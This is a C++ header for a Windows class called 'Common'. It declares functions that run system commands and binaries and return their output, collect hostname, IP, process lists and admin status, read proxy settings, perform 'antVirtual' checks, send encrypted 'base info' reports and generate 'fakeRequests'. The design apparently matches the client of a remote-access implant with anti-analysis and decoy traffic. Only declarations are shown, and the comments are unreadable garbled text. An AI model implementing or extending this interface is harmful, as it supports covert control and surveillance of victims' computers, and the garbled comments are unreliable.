#pragma once

#include <iostream>
#include <curl/curl.h>
#include "zlib.h"
#include <vector>
#include <string>


#include "AES.h"
#include "Base64.h"

#include <windows.h>
#include <tchar.h>
#include <string>
#include <iostream>
#include "stdio.h"

#pragma comment(lib, "version.lib")

using namespace std;

class Common {
public:
    Common();
    ~Common();
public:

    //��ȡ���������Ϣ
    static string GetFileVersion(char* strFilePath);

    //ִ�ж������ļ�
    static int exec(const char* bin, const BOOL flag);

    //ִ��ϵͳ����󷵻ؽ��
    static string execCMD(char* cmd);


    static wstring string2wstring(string str);


    static string ExeCmd(string pszCmd);

    //��ȡIE����������Ϣ
    static string getIEProxy();

    // �����ļ���
    static int createDir(const char* Dir);

    // �������
    static void antVirtual(const BOOL flag);

    // ׷��ʱ���
    static void addTimestamp(const char* DesFileName);

    //��ȡ������-IP��ַ
    static string getHostname();

    //��ȡ����Donet�汾
    static string getNetAllVersions();

    //�ж�ϵͳλ��
    static BOOL is64bitSystem();

    //��ȡ����ProcessLists
    static string getProcessList();

    //��־�ϱ�
    static void logReport(const char* data);

    //������Ϣ�ϱ�
    static string baseInfoReport(const char* data);

    //��ȡ��ǰʱ���
    static string getTimeStmp();

    //�ж��Ƿ�Ϊ����Ա
    static BOOL isAdmin();

    //���ٵ�����
    static void Common::fakeRequests();


    //AES�ӽ��ܲ���
    static string aesEncrypt(const string& strSrc);
    static string aesDecrypt(const string& strSrc);

};